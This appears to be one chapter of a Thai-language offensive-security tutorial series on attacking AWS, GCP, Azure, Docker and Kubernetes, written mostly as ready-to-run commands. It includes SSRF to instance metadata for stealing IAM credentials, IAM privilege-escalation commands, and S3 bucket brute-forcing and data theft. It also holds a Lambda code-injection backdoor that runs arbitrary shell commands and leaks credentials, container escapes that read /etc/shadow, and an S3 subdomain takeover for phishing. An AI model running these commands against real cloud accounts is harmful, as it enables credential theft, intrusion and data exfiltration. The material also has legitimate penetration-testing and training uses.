# Part 45: Cloud Security Attacks - AWS, GCP, Azure

## สารบัญ
1. [Cloud Security Overview](#1)
2. [AWS Enumeration และ Attack Paths](#2)
3. [IAM Privilege Escalation](#3)
4. [S3 Bucket Attacks](#4)
5. [Lambda Function Exploitation](#5)
6. [GCP Security](#6)
7. [Azure Security](#7)
8. [Container Security (Docker/K8s)](#8)
9. [Cloud Tools](#9)
10. [Lab Exercises](#10)

---

## 1. Cloud Security Overview

```
Cloud Attack Surface:
- IAM (Identity and Access Management) misconfigs
- Exposed storage (S3, GCS, Azure Blob)
- Overprivileged service accounts
- Public cloud resources (RDS, EC2, etc.)
- Serverless function injection
- Container escape
- SSRF to metadata service

Cloud Security Model:
- Shared Responsibility Model
- Cloud provider: Physical, network, hypervisor
- Customer: OS, apps, data, IAM
```

---

## 2. AWS Enumeration และ Attack Paths

### AWS CLI Setup

```bash
# ติดตั้ง AWS CLI
apt install awscli
pip3 install awscli

# ตั้งค่า
aws configure
# AWS Access Key ID: AKIA...
# AWS Secret Access Key: ...
# Default region: ap-southeast-1
# Default output format: json

# หรือตั้ง env vars
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_DEFAULT_REGION=ap-southeast-1

# ตรวจสอบ identity
aws sts get-caller-identity
# {
#   "UserId": "AIDAXXXXXXXXXX",
#   "Account": "123456789012",
#   "Arn": "arn:aws:iam::123456789012:user/hacked-user"
# }
```

### AWS Enumeration สำหรับ Red Team

```bash
# สำรวจ IAM
aws iam get-user
aws iam list-users
aws iam list-groups
aws iam list-roles
aws iam list-policies --scope Local
aws iam list-attached-user-policies --user-name current-user
aws iam get-policy-version --policy-arn ARN --version-id v1

# สำรวจ EC2
aws ec2 describe-instances
aws ec2 describe-security-groups
aws ec2 describe-vpcs
aws ec2 describe-subnets

# สำรวจ S3
aws s3 ls
aws s3 ls s3://bucket-name --recursive
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name

# สำรวจ Secrets
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME

# สำรวจ Lambda
aws lambda list-functions
aws lambda get-function --function-name FUNC_NAME
aws lambda get-function-configuration --function-name FUNC_NAME

# สำรวจ RDS
aws rds describe-db-instances
aws rds describe-db-snapshots --include-public

# หา CloudTrail logs
aws cloudtrail lookup-events --max-results 10
aws cloudtrail list-trails

# enumerate with enumerate-iam
pip3 install enumerate-iam
enumerate-iam --access-key AKIA... --secret-key SECRET --region ap-southeast-1
```

### AWS SSRF to Metadata

```bash
# ถ้ามี SSRF vulnerability บน EC2
# สามารถเข้าถึง instance metadata
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-ROLE-NAME

# Output:
# {
#   "Code": "Success",
#   "Type": "AWS-HMAC",
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "IQoJb3JpZ2...",
#   "Expiration": "2026-09-28T12:00:00Z"
# }

# นำไปใช้
# aws configure --profile stolen
# ใส่ค่าจาก response
aws --profile stolen sts get-caller-identity

# IMDSv2 (more secure)
curl -X PUT 'http://169.254.169.254/latest/api/token' \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'
# TOKEN=...

curl 'http://169.254.169.254/latest/meta-data/' \
  -H 'X-aws-ec2-metadata-token: TOKEN'
```

---

## 3. IAM Privilege Escalation

```bash
# เทคนิค IAM PrivEsc ที่พบบ่อย

# 1. iam:CreatePolicyVersion
# สร้าง version ใหม่ของ policy พร้อม admin access
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# 2. iam:CreateLoginProfile
# แนบจากเอา admin user
aws iam create-login-profile --user-name admin --password 'P@ssw0rd!'

# 3. iam:AddUserToGroup
# เพิ่ม user เข้า admin group
aws iam add-user-to-group --group-name AdminGroup --user-name attacker

# 4. Lambda + iam:PassRole
# สร้าง Lambda พร้อม admin role
aws lambda create-function \
  --function-name privesc \
  --runtime python3.9 \
  --handler lambda_function.lambda_handler \
  --role arn:aws:iam::123456789012:role/admin-role \
  --zip-file fileb://function.zip

# 5. CloudFormation สร้าง IAM
aws cloudformation create-stack \
  --stack-name privesc \
  --template-body file://privesc.yaml \
  --capabilities CAPABILITY_IAM

# Pacu - AWS privilege escalation tool
python3 pacu.py
# run iam__privesc_scan
```

---

## 4. S3 Bucket Attacks

```bash
# หา S3 buckets ที่เปิด public

# 1. Brute force bucket names
cat > buckets.txt << 'EOF'
company-data
company-backup
company-dev
company-prod
company-staging
company-logs
company-static
company-public
EOF

# ทดสอบทีละเอกชั่ว
 while read bucket; do
  if aws s3 ls s3://$bucket 2>/dev/null; then
    echo "[+] Found: $bucket"
  fi
done < buckets.txt

# 2. Check permissions
aws s3api get-bucket-acl --bucket TARGET_BUCKET
aws s3api get-bucket-policy --bucket TARGET_BUCKET
aws s3api get-bucket-cors --bucket TARGET_BUCKET

# Public read/write check
curl -s https://TARGET_BUCKET.s3.amazonaws.com/ | head -50

# 3. Copy sensitive files
aws s3 ls s3://TARGET_BUCKET/ --recursive | grep -E '(password|secret|key|config|backup)'
aws s3 cp s3://TARGET_BUCKET/secrets.txt /tmp/
aws s3 sync s3://TARGET_BUCKET/ /tmp/stolen/

# 4. Upload malicious file (if write permission)
echo 'Test write access' > test.txt
aws s3 cp test.txt s3://TARGET_BUCKET/

# 5. S3Scanner tool
pip3 install s3scanner
s3scanner scan --bucket-file buckets.txt

# 6. Pacu S3 module
# run s3__bucket_enum
# run s3__download_bucket
```

---

## 5. Lambda Function Exploitation

```bash
# ขั้นที่ 1: สำรวจ Lambda functions
aws lambda list-functions --query 'Functions[].FunctionName'

# ขั้นที่ 2: ดึงโค้ด
aws lambda get-function --function-name FUNCTION_NAME
# Returns code S3 URL
wget 'S3_URL_FROM_ABOVE' -O function.zip
unzip function.zip

# ขั้นที่ 3: หา secrets ในโค้ด
grep -r 'password\|secret\|key\|token' function/

# ขั้นที่ 4: Environment variables
aws lambda get-function-configuration --function-name FUNCTION_NAME \
  | python3 -c "import json,sys; d=json.load(sys.stdin); print(json.dumps(d.get('Environment', {}), indent=2))"

# ขั้นที่ 5: Inject malicious code (ถ้ามีสิทธิ์)
cat > inject.py << 'EOF'
import boto3
import os

def lambda_handler(event, context):
    # Execute command
    import subprocess
    cmd = event.get('cmd', 'id')
    result = subprocess.check_output(cmd, shell=True).decode()
    
    # Exfiltrate env vars (contains IAM credentials)
    return {
        'env': dict(os.environ),
        'cmd_result': result
    }
EOF

zip inject.zip inject.py
aws lambda update-function-code \
  --function-name FUNCTION_NAME \
  --zip-file fileb://inject.zip

# ขั้นที่ 6: เรียก function
aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload '{"cmd": "env"}' \
  output.json
cat output.json
```

---

## 6. GCP Security

```bash
# ติดตั้ง gcloud CLI
curl https://sdk.cloud.google.com | bash

# Login
gcloud auth login
gcloud auth activate-service-account --key-file=key.json

# สำรวจ
gcloud projects list
gcloud compute instances list
gcloud iam service-accounts list
gcloud storage buckets list
gcloud sql instances list
gcloud functions list
gcloud secrets list

# ได้รับ metadata
curl 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
  -H 'Metadata-Flavor: Google'

# Output: 
# {"access_token":"ya29...","expires_in":3599,"token_type":"Bearer"}

# ใช้ token
export TOKEN='ya29...'
gcloud auth activate-service-account --access-token=$TOKEN

# Service Account Key
gcloud iam service-accounts keys create key.json \
  --iam-account=sa@project.iam.gserviceaccount.com
```

---

## 7. Azure Security

```bash
# ติดตั้ง az CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | bash

# Login
az login
az login --service-principal -u CLIENT_ID -p SECRET --tenant TENANT_ID

# สำรวจ
az account show
az account list
az resource list
az vm list
az ad user list
az ad group list
az role assignment list
az keyvault list
az storage account list

# ได้รับ Azure IMDS
curl -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | python3 -m json.tool

# ได้รับ token จาก IMDS
curl -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
# access_token: eyJ...

# Key Vault secrets
az keyvault secret list --vault-name VAULT_NAME
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME

# Storage Blob
az storage blob list --account-name STORAGE --container-name CONTAINER
az storage blob download --account-name STORAGE --container-name CONTAINER --name FILE
```

---

## 8. Container Security (Docker/K8s)

### Docker Escape

```bash
# ตรวจสอบว่าอยู่ใน container
ls /.dockerenv
cat /proc/1/cgroup | grep docker

# Escape via privileged container
# ถ้า container รันด้วย --privileged
findmnt | grep sd
# /dev/sda1 = host filesystem

mount /dev/sda1 /mnt/host
chroot /mnt/host  # access host OS!

# Escape via Docker socket
ls -la /var/run/docker.sock
# ถ้าเปิด = escape ได้
docker -H unix:///var/run/docker.sock run -it \
  --privileged \
  --pid=host \
  -v /:/mnt/host \
  ubuntu:latest \
  chroot /mnt/host bash
```

### Kubernetes Attack

```bash
# สำรวจ K8s cluster
kubectl get pods --all-namespaces
kubectl get services --all-namespaces
kubectl get nodes
kubectl get secrets --all-namespaces

# ดึง ServiceAccount token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# ใช้ token โจมตี K8s API
KUBE_API=https://10.0.0.1:6443
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $KUBE_API/api/v1/namespaces/default/secrets/

# สร้าง privileged pod
cat > escape-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: escape
    image: ubuntu:latest
    command: ["/bin/bash", "-c", "chroot /host bash -c 'cat /etc/shadow'"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
  restartPolicy: Never
EOF

kubectl apply -f escape-pod.yaml
kubectl logs escape-pod
```

---

## 9. Cloud Tools

```bash
# ScoutSuite - multi-cloud security audit
pip3 install scoutsuite
scout aws  # AWS
scout gcp  # GCP
scout azure  # Azure

# Pacu - AWS exploitation
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu && pip3 install -r requirements.txt
python3 pacu.py

# CloudSplaining - IAM least privilege analysis
pip3 install cloudsplaining
cloudsplaining download --profile default
cloudsplaining scan --input-file ACCOUNT.json

# Prowler - AWS security best practices
pip3 install prowler
prowler aws
prowler aws -s s3,iam,ec2

# ROADtools - Azure AD enumeration
pip3 install roadtools
roadrecon auth -u user@company.com
roadrecon gather
roadrecon dump
```

---

## 10. Lab Exercises

### Lab 1: AWS Credential Extraction

```bash
# Scenario: SSRF บน web application
# Target: http://vulnerable-app.com/?url=...

# Step 1: SSRF to metadata
curl 'http://vulnerable-app.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
# Output: EC2-ROLE-NAME

curl 'http://vulnerable-app.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-ROLE-NAME'
# Output: AccessKeyId, SecretAccessKey, Token

# Step 2: ใช้ credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=IQoJb...

# Step 3: สำรวจ
aws sts get-caller-identity
aws s3 ls
aws iam list-roles
```

### Lab 2: S3 Bucket Takeover

```bash
# หา subdomain ที่ใช้ S3 แต่ถูกลบ
dig CNAME assets.company.com
# assets.company.com CNAME company-assets.s3.amazonaws.com

curl -s https://assets.company.com/
# NoSuchBucket - bucket ถูกลบแล้ว!

# สร้าง bucket ด้วยชื่อเดียวกัน
aws s3api create-bucket --bucket company-assets --region ap-southeast-1 \
  --create-bucket-configuration LocationConstraint=ap-southeast-1

# เปิด public
aws s3api put-bucket-policy --bucket company-assets --policy '{
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::company-assets/*"
  }]
}'

# อัปโหลดไฟล์สำหรับ phishing/malware
echo '<html><script>document.cookie</script></html>' > index.html
aws s3 cp index.html s3://company-assets/
```

---

## สรุป

| Platform | Tool | วัตถุประสงค์ |
|----------|------|----------|
| AWS | Pacu, enumerate-iam | Privilege Escalation |
| AWS | S3Scanner | Bucket Discovery |
| AWS | Prowler | Security Audit |
| GCP | gcloud | Enumeration |
| Azure | ROADtools | AD Enumeration |
| All | ScoutSuite | Multi-cloud Audit |
| Container | kubectl | K8s Exploitation |
| Docker | docker.sock | Container Escape |

---

**ต่อไป:** [Part 46 - Web Application Advanced Attacks](Part-46-Web-Application-Advanced.md)
